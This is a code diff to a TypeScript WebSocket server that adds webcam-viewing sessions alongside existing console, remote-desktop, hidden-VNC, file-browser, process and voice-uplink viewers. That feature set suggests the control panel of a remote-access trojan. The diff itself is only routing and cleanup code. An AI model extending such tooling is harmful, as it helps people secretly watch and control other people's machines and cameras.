@@ -29,9 +29,11 @@ type WsLifecycleDeps = {
   pendingCommandReplies: Map<string, PendingCommandReply>;
   rdStreamingState: Map<string, unknown>;
   hvncStreamingState: Map<string, unknown>;
+  webcamStreamingState: Map<string, unknown>;
   getNotificationConfig: () => { keywords?: string[]; minIntervalMs?: number };
   handleConsoleViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
   handleRemoteDesktopViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
+  handleWebcamViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
   handleHVNCViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
   handleFileBrowserViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
   handleProcessViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
@@ -41,6 +43,7 @@ type WsLifecycleDeps = {
   handleNotificationViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
   handleConsoleViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
   handleRemoteDesktopViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
+  handleWebcamViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
   handleHVNCViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
   handleFileBrowserViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
   handleProcessViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
@@ -67,6 +70,7 @@ type WsLifecycleDeps = {
   handlePluginEvent: (clientId: string, payload: any) => void;
   handleNotification: (clientId: string, payload: any) => void;
   handleVoiceUplink: (clientId: string, payload: any) => void;
+  handleWebcamDevices: (clientId: string, payload: any) => void;
   cleanupVoiceViewer: (ws: ServerWebSocket<SocketData>) => void;
   stopConsoleOnTarget: (target: ClientInfo | undefined, sessionId: string) => void;
   sendDesktopCommand: (target: ClientInfo | undefined, commandType: string, payload: Record<string, unknown>) => void;
@@ -82,6 +86,7 @@ export function handleWebSocketOpen(ws: ServerWebSocket<SocketData>, deps: WsLif
   const ip = ws.data.ip;
   if (role === "console_viewer") return deps.handleConsoleViewerOpen(ws);
   if (role === "rd_viewer") return deps.handleRemoteDesktopViewerOpen(ws);
+  if (role === "webcam_viewer") return deps.handleWebcamViewerOpen(ws);
   if (role === "hvnc_viewer") return deps.handleHVNCViewerOpen(ws);
   if (role === "file_browser_viewer") return deps.handleFileBrowserViewerOpen(ws);
   if (role === "process_viewer") return deps.handleProcessViewerOpen(ws);
@@ -140,6 +145,7 @@ export function handleWebSocketMessage(
   const socketRole = ws.data.role as string;
   if (socketRole === "console_viewer") return deps.handleConsoleViewerMessage(ws, message);
   if (socketRole === "rd_viewer") return deps.handleRemoteDesktopViewerMessage(ws, message);
+  if (socketRole === "webcam_viewer") return deps.handleWebcamViewerMessage(ws, message);
   if (socketRole === "hvnc_viewer") return deps.handleHVNCViewerMessage(ws, message);
   if (socketRole === "file_browser_viewer") return deps.handleFileBrowserViewerMessage(ws, message);
   if (socketRole === "process_viewer") return deps.handleProcessViewerMessage(ws, message);
@@ -285,6 +291,9 @@ export function handleWebSocketMessage(
       case "voice_uplink":
         deps.handleVoiceUplink(info.id, payload);
         break;
+      case "webcam_devices":
+        deps.handleWebcamDevices(info.id, payload);
+        break;
       default:
         break;
     }
@@ -328,6 +337,26 @@ export function handleWebSocketClose(
       deps.sendDesktopCommand(target, "desktop_stop", {});
       deps.rdStreamingState.delete(removedClientId);
       logger.debug(`[rd] cleaned up state for client ${removedClientId}`);
+    }
+    return;
+  }
+
+  if (role === "webcam_viewer") {
+    let removedClientId = clientId;
+    for (const [sid, sess] of sessionManager.getAllWebcamSessions().entries()) {
+      if (sess.viewer === ws) {
+        removedClientId = sess.clientId;
+        sessionManager.getAllWebcamSessions().delete(sid);
+        break;
+      }
+    }
+
+    const stillViewing = Array.from(sessionManager.getAllWebcamSessions().values()).some((s) => s.clientId === removedClientId);
+    if (!stillViewing) {
+      const target = clientManager.getClient(removedClientId);
+      deps.sendDesktopCommand(target, "webcam_stop", {});
+      deps.webcamStreamingState.delete(removedClientId);
+      logger.debug(`[webcam] cleaned up state for client ${removedClientId}`);
     }
     return;
   }
